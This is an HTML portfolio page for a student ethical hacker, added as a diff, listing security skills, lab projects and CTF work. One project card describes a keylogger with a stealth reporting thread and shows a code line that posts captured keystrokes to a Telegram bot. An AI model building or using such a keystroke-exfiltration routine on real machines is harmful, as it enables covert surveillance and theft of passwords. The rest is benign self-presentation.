@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pratik Adhikari · Ethical Hacker Portfolio</title>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0a0e17;
+      color: #e0e6f0;
+      line-height: 1.6;
+    }
+
+    /* scrollbar */
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: #0a0e17; }
+    ::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 8px; }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    /* ===== HERO / PROFILE ===== */
+    .hero {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 40px;
+      padding: 40px 30px;
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 28px;
+      border: 1px solid #1e2d44;
+      box-shadow: 0 0 40px rgba(0, 255, 157, 0.05);
+      margin-bottom: 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -20%;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(0, 255, 157, 0.06), transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    /* photo upload placeholder */
+    .photo-wrapper {
+      flex-shrink: 0;
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background: #0d1624;
+      border: 3px dashed #00ff9d;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(0, 255, 157, 0.15);
+    }
+
+    .photo-wrapper:hover {
+      border-color: #7b2ffc;
+      box-shadow: 0 0 40px rgba(123, 47, 252, 0.25);
+    }
+
+    .photo-wrapper i {
+      font-size: 3rem;
+      color: #00ff9d;
+      opacity: 0.6;
+      margin-bottom: 6px;
+    }
+
+    .photo-wrapper span {
+      font-size: 0.7rem;
+      color: #8899bb;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .photo-wrapper input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+    }
+
+    .photo-wrapper img {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+    }
+
+    /* hero text */
+    .hero-text {
+      flex: 1;
+      min-width: 280px;
+      z-index: 1;
+    }
+
+    .hero-text .greeting {
+      font-size: 0.9rem;
+      color: #00ff9d;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .hero-text h1 {
+      font-size: 3rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, #ffffff 40%, #00ff9d);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 6px;
+    }
+
+    .hero-text .title {
+      font-size: 1.3rem;
+      color: #aabbdd;
+      font-weight: 400;
+      margin-bottom: 14px;
+    }
+
+    .hero-text .title i {
+      color: #00ff9d;
+      margin-right: 8px;
+    }
+
+    .hero-text .tagline {
+      font-size: 1rem;
+      color: #8899bb;
+      max-width: 600px;
+      margin-bottom: 18px;
+    }
+
+    .hero-badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .hero-badges .badge {
+      background: rgba(0, 255, 157, 0.08);
+      border: 1px solid rgba(0, 255, 157, 0.2);
+      color: #00ff9d;
+      padding: 6px 16px;
+      border-radius: 30px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .hero-badges .badge i {
+      font-size: 0.9rem;
+    }
+
+    /* ===== SECTIONS ===== */
+    section {
+      margin-bottom: 45px;
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 22px;
+    }
+
+    .section-header i {
+      font-size: 1.6rem;
+      color: #00ff9d;
+      width: 2rem;
+      text-align: center;
+    }
+
+    .section-header h2 {
+      font-size: 1.7rem;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      color: #e0e6f0;
+    }
+
+    .section-header .line {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, #1e2d44, transparent);
+      margin-left: 10px;
+    }
+
+    /* qualification card */
+    .qual-card {
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 18px;
+      padding: 28px 30px;
+      border: 1px solid #1e2d44;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 30px;
+      align-items: center;
+    }
+
+    .qual-card .qual-icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 16px;
+      background: rgba(0, 255, 157, 0.08);
+      border: 1px solid rgba(0, 255, 157, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.8rem;
+      color: #00ff9d;
+      flex-shrink: 0;
+    }
+
+    .qual-card .qual-text {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    .qual-card .qual-text h3 {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 4px;
+    }
+
+    .qual-card .qual-text p {
+      color: #8899bb;
+      font-size: 0.95rem;
+    }
+
+    .qual-card .qual-text .sub {
+      color: #00ff9d;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+
+    /* skills grid */
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 18px;
+    }
+
+    .skill-category {
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 16px;
+      padding: 22px;
+      border: 1px solid #1e2d44;
+      transition: all 0.3s ease;
+    }
+
+    .skill-category:hover {
+      border-color: rgba(0, 255, 157, 0.3);
+      box-shadow: 0 8px 28px rgba(0, 255, 157, 0.04);
+      transform: translateY(-3px);
+    }
+
+    .skill-category h3 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #00ff9d;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .skill-category h3 i {
+      font-size: 1.1rem;
+      width: 24px;
+      color: #7b2ffc;
+    }
+
+    .skill-category ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .skill-category ul li {
+      font-size: 0.9rem;
+      color: #b0c4dd;
+      padding: 4px 0 4px 18px;
+      position: relative;
+    }
+
+    .skill-category ul li::before {
+      content: '▹';
+      position: absolute;
+      left: 0;
+      color: #00ff9d;
+      font-size: 0.9rem;
+    }
+
+    /* projects */
+    .projects-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+    }
+
+    .project-card {
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 16px;
+      padding: 24px;
+      border: 1px solid #1e2d44;
+      border-left: 3px solid #00ff9d;
+      transition: all 0.3s ease;
+    }
+
+    .project-card:hover {
+      border-left-color: #7b2ffc;
+      border-color: #1e2d44;
+      border-left-color: #7b2ffc;
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .project-card .project-icon {
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+      color: #00ff9d;
+    }
+
+    .project-card h3 {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 4px;
+    }
+
+    .project-card .tech {
+      font-size: 0.78rem;
+      color: #8899bb;
+      letter-spacing: 0.3px;
+      margin-bottom: 8px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+    }
+
+    .project-card .tech span {
+      background: rgba(123, 47, 252, 0.12);
+      border: 1px solid rgba(123, 47, 252, 0.15);
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 0.72rem;
+      color: #b8a0f0;
+    }
+
+    .project-card p {
+      font-size: 0.9rem;
+      color: #b0c4dd;
+    }
+
+    .project-card .code-line {
+      background: #0a0e17;
+      border: 1px solid #1a2a40;
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.78rem;
+      color: #8af0c0;
+      margin-top: 10px;
+      overflow-x: auto;
+    }
+
+    /* toolchain */
+    .toolchain {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 16px;
+      padding: 22px 24px;
+      border: 1px solid #1e2d44;
+    }
+
+    .toolchain .tag {
+      background: rgba(0, 255, 157, 0.06);
+      border: 1px solid rgba(0, 255, 157, 0.12);
+      color: #aabbdd;
+      padding: 5px 16px;
+      border-radius: 30px;
+      font-size: 0.82rem;
+      font-weight: 500;
+      transition: all 0.2s ease;
+    }
+
+    .toolchain .tag:hover {
+      border-color: #00ff9d;
+      color: #00ff9d;
+      background: rgba(0, 255, 157, 0.08);
+    }
+
+    /* contact */
+    .contact-card {
+      background: linear-gradient(145deg, #0f1a2b, #0b1420);
+      border-radius: 18px;
+      padding: 32px 30px;
+      border: 1px solid #1e2d44;
+      text-align: center;
+    }
+
+    .contact-card p {
+      color: #aabbdd;
+      margin-bottom: 18px;
+      font-size: 1rem;
+    }
+
+    .contact-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 30px;
+    }
+
+    .contact-links a {
+      color: #e0e6f0;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.95rem;
+      padding: 8px 18px;
+      border-radius: 40px;
+      border: 1px solid #1e2d44;
+      transition: all 0.3s ease;
+    }
+
+    .contact-links a i {
+      color: #00ff9d;
+      font-size: 1.2rem;
+    }
+
+    .contact-links a:hover {
+      border-color: #00ff9d;
+      background: rgba(0, 255, 157, 0.04);
+      transform: translateY(-2px);
+    }
+
+    /* footer */
+    .footer {
+      text-align: center;
+      padding: 30px 0 20px;
+      border-top: 1px solid #1e2d44;
+      margin-top: 20px;
+      color: #556688;
+      font-size: 0.85rem;
+    }
+
+    .footer .terminal {
+      font-family: 'Courier New', monospace;
+      color: #00ff9d;
+      font-size: 0.8rem;
+      display: inline-block;
+      background: #0a0e17;
+      padding: 6px 18px;
+      border-radius: 20px;
+      border: 1px solid #1a2a40;
+      margin-bottom: 12px;
+    }
+
+    .footer .terminal .blink {
+      animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    /* responsive */
+    @media (max-width: 700px) {
+      .hero {
+        flex-direction: column;
+        text-align: center;
+        padding: 30px 20px;
+      }
+      .hero-text h1 { font-size: 2.2rem; }
+      .hero-text .tagline { margin-left: auto; margin-right: auto; }
+      .hero-badges { justify-content: center; }
+      .photo-wrapper { width: 140px; height: 140px; }
+      .photo-wrapper i { font-size: 2.2rem; }
+      .section-header h2 { font-size: 1.3rem; }
+      .qual-card { flex-direction: column; text-align: center; }
+      .contact-links { flex-direction: column; align-items: center; gap: 12px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- ===== HERO WITH PHOTO UPLOAD ===== -->
+  <header class="hero">
+    <!-- PHOTO UPLOAD PLACEHOLDER -->
+    <div class="photo-wrapper" id="photoWrapper">
+      <i class="fas fa-camera"></i>
+      <span>Upload Photo</span>
+      <input type="file" accept="image/*" id="photoInput">
+      <img id="photoPreview" src="" alt="Profile Photo">
+    </div>
+
+    <div class="hero-text">
+      <div class="greeting"><i class="fas fa-terminal"></i> whoami</div>
+      <h1>Pratik Adhikari</h1>
+      <div class="title"><i class="fas fa-shield-alt"></i> Ethical Hacker · Penetration Tester</div>
+      <p class="tagline">
+        IT student & hands-on security practitioner. I break, build, and secure systems —
+        from CTF boxes on TryHackMe and HackTheBox to real VPN deployments and Python automation.
+      </p>
+      <div class="hero-badges">
+        <span class="badge"><i class="fas fa-crosshairs"></i> Pentesting</span>
+        <span class="badge"><i class="fas fa-network-wired"></i> Networking</span>
+        <span class="badge"><i class="fab fa-linux"></i> Kali / Ubuntu</span>
+        <span class="badge"><i class="fab fa-python"></i> Python</span>
+        <span class="badge"><i class="fas fa-bug"></i> CTF</span>
+        <span class="badge"><i class="fas fa-lock"></i> WireGuard</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== QUALIFICATION ===== -->
+  <section>
+    <div class="section-header">
+      <i class="fas fa-graduation-cap"></i>
+      <h2>Qualification</h2>
+      <div class="line"></div>
+    </div>
+    <div class="qual-card">
+      <div class="qual-icon"><i class="fas fa-user-graduate"></i></div>
+      <div class="qual-text">
+        <h3>Bachelor's in Information Technology (IT)</h3>
+        <p class="sub">Currently Pursuing · Nepal</p>
+        <p style="margin-top:6px; color:#8899bb; font-size:0.92rem;">
+          Focused on cybersecurity, network security, and ethical hacking.
+          Actively practicing on TryHackMe & HackTheBox alongside academic coursework.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== SKILLS ===== -->
+  <section>
+    <div class="section-header">
+      <i class="fas fa-code"></i>
+      <h2>Technical Skills</h2>
+      <div class="line"></div>
+    </div>
+    <div class="skills-grid">
+      <div class="skill-category">
+        <h3><i class="fas fa-crosshairs"></i> Offensive Security</h3>
+        <ul>
+          <li>Nmap, Gobuster, Feroxbuster, enum4linux</li>
+          <li>Metasploit, SQLMap, Hydra, WPScan</li>
+          <li>Burp Suite, manual SQLi / XSS / LFI</li>
+          <li>Privilege escalation (SUID, sudo, cron)</li>
+          <li>Hashcat, John the Ripper, bcrypt cracking</li>
+        </ul>
+      </div>
+      <div class="skill-category">
+        <h3><i class="fas fa-network-wired"></i> Networking</h3>
+        <ul>
+          <li>TCP/IP, UDP, ICMP, DNS, HTTP/HTTPS</li>
+          <li>WireGuard VPN deployment & tunneling</li>
+          <li>tcpdump, Wireshark packet analysis</li>
+          <li>iptables, ufw, fail2ban hardening</li>
+          <li>Routing, NAT, SMB, LDAP, Kerberos</li>
+        </ul>
+      </div>
+      <div class="skill-category">
+        <h3><i class="fab fa-linux"></i> Systems</h3>
+        <ul>
+          <li>Kali Linux, Ubuntu Server, Debian</li>
+          <li>Bash scripting & automation</li>
+          <li>systemd, process & service management</li>
+          <li>File permissions, SUID auditing</li>
+          <li>VirtualBox, VMware, VM networking</li>
+        </ul>
+      </div>
+      <div class="skill-category">
+        <h3><i class="fab fa-python"></i> Programming</h3>
+        <ul>
+          <li>Python 3 (automation, servers, tools)</li>
+          <li>pynput, requests, ssl, http.server</li>
+          <li>Telegram Bot API integration</li>
+          <li>Wordlist / payload generation</li>
+          <li>Git, CLI tooling, Linux dev workflow</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== PROJECTS ===== -->
+  <section>
+    <div class="section-header">
+      <i class="fas fa-flask"></i>
+      <h2>Featured Projects</h2>
+      <div class="line"></div>
+    </div>
+    <div class="projects-grid">
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fas fa-lock"></i></div>
+        <h3>WireGuard VPN Tunnel — Kali ↔ Ubuntu</h3>
+        <div class="tech">
+          <span>VPN</span><span>Cryptography</span><span>Encapsulation</span>
+        </div>
+        <p>Deployed a secure WireGuard tunnel between Kali and Ubuntu VMs using public-key cryptography. Configured private IP space (10.0.0.0/24), verified ICMP over the tunnel, and observed encapsulation by capturing encrypted UDP traffic on port 51820.</p>
+        <div class="code-line">
+          <span style="color:#557788;"># On Ubuntu (server)</span><br>
+          <span style="color:#7b9fd4;">sudo wg-quick up wg0</span><br>
+          <span style="color:#557788;"># Encapsulation visible on eth0</span><br>
+          <span style="color:#7b9fd4;">sudo tcpdump -i eth0 port 51820</span>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fab fa-python"></i></div>
+        <h3>Python Keylogger with Telegram C2</h3>
+        <div class="tech">
+          <span>Python</span><span>pynput</span><span>Telegram API</span>
+        </div>
+        <p>Built an ethical keylogger that captures keystrokes, buffers them, and exfiltrates logs to a Telegram bot every 30 seconds. Handled special keys and added a stealth thread for periodic reporting.</p>
+        <div class="code-line">
+          <span style="color:#557788;">from pynput.keyboard import Listener, Key</span><br>
+          <span style="color:#7b9fd4;">requests.post(telegram_url, data=&#123;"chat_id": CHAT_ID, "text": log_buffer&#125;)</span>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fas fa-globe"></i></div>
+        <h3>Custom Python HTTPS Server</h3>
+        <div class="tech">
+          <span>Python</span><span>SSL/TLS</span><span>OpenSSL</span>
+        </div>
+        <p>Built a custom HTTPS server using <code>http.server</code> and <code>ssl.SSLContext</code>. Generated self-signed certs, bound to port 8443, and debugged port conflicts and process management.</p>
+        <div class="code-line">
+          <span style="color:#557788;">context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)</span><br>
+          <span style="color:#7b9fd4;">httpd.socket = context.wrap_socket(httpd.socket, server_side=True)</span>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fas fa-bug"></i></div>
+        <h3>CTF Walkthroughs — THM & HTB</h3>
+        <div class="tech">
+          <span>Pentesting</span><span>Web</span><span>PrivEsc</span><span>Forensics</span>
+        </div>
+        <p>Completed multiple CTF boxes including <strong>Simple CTF</strong>, <strong>LazyAdmin</strong>, <strong>Blue</strong>, <strong>Archetype</strong>, <strong>Carnage</strong> (Wireshark forensics), <strong>Dirty Pipe</strong>, <strong>Breakme</strong>, and <strong>Publisher</strong>.</p>
+      </div>
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fas fa-tools"></i></div>
+        <h3>Wordlist & Payload Generators</h3>
+        <div class="tech">
+          <span>Python</span><span>Automation</span><span>Hashcat</span>
+        </div>
+        <p>Wrote Python scripts to generate custom wordlists with case variations, @ separators, and 3–6 digit numbers. Used them with Hashcat and John to crack MD5 and SHA-256 hashes in CTF labs.</p>
+        <div class="code-line">
+          <span style="color:#557788;">for word in [kw, kw.upper(), kw.capitalize()]:</span><br>
+          <span style="color:#7b9fd4;">    for num in range(1000): print(f"&#123;word&#125;@&#123;num:03d&#125;")</span>
+        </div>
+      </div>
+
+      <div class="project-card">
+        <div class="project-icon"><i class="fas fa-firewall"></i></div>
+        <h3>fail2ban Intrusion Prevention</h3>
+        <div class="tech">
+          <span>Security</span><span>iptables</span><span>Log Analysis</span>
+        </div>
+        <p>Configured fail2ban to monitor authentication logs and automatically block malicious IPs via iptables. Customized jail configurations for SSH and web services, reducing brute-force attack surface.</p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ===== TOOLCHAIN ===== -->
+  <section>
+    <div class="section-header">
+      <i class="fas fa-terminal"></i>
+      <h2>Toolchain</h2>
+      <div class="line"></div>
+    </div>
+    <div class="toolchain">
+      <span class="tag">Kali Linux</span>
+      <span class="tag">Ubuntu Server</span>
+      <span class="tag">Nmap</span>
+      <span class="tag">Metasploit</span>
+      <span class="tag">Burp Suite</span>
+      <span class="tag">SQLMap</span>
+      <span class="tag">Hashcat</span>
+      <span class="tag">John the Ripper</span>
+      <span class="tag">Hydra</span>
+      <span class="tag">Wireshark</span>
+      <span class="tag">tcpdump</span>
+      <span class="tag">WireGuard</span>
+      <span class="tag">iptables</span>
+      <span class="tag">fail2ban</span>
+      <span class="tag">Python 3</span>
+      <span class="tag">Bash</span>
+      <span class="tag">VirtualBox</span>
+      <span class="tag">Git</span>
+    </div>
+  </section>
+
+  <!-- ===== CONTACT ===== -->
+  <section>
+    <div class="section-header">
+      <i class="fas fa-paper-plane"></i>
+      <h2>Connect</h2>
+      <div class="line"></div>
+    </div>
+    <div class="contact-card">
+      <p>Open to security internships, junior pentesting roles, and CTF collaborations.</p>
+      <div class="contact-links">
+        <a href="mailto:apratik280@gmail.com"><i class="fas fa-envelope"></i> apratik280@gmail.com</a>
+        <a href="#"><i class="fab fa-github"></i> github.com/apratik</a>
+        <a href="#"><i class="fab fa-linkedin"></i> /in/pratik-adhikari</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== FOOTER ===== -->
+  <footer class="footer">
+    <div class="terminal">
+      <span style="color:#557788;">$</span> echo "portfolio built from real hands-on sessions" <span class="blink">█</span>
+    </div>
+    <p>&copy; 2026 Pratik Adhikari — Built from TryHackMe, HackTheBox & Kali Linux practice</p>
+  </footer>
+
+</div>
+
+<!-- ===== PHOTO UPLOAD PREVIEW SCRIPT ===== -->
+<script>
+  const photoInput = document.getElementById('photoInput');
+  const photoPreview = document.getElementById('photoPreview');
+  const photoWrapper = document.getElementById('photoWrapper');
+
+  photoInput.addEventListener('change', function (e) {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = function (event) {
+        photoPreview.src = event.target.result;
+        photoPreview.style.display = 'block';
+        // hide the camera icon and text
+        photoWrapper.querySelector('i').style.display = 'none';
+        photoWrapper.querySelector('span').style.display = 'none';
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  // optional: click anywhere on the wrapper triggers input (already works because input is absolute)
+</script>
+
+</body>
+</html>
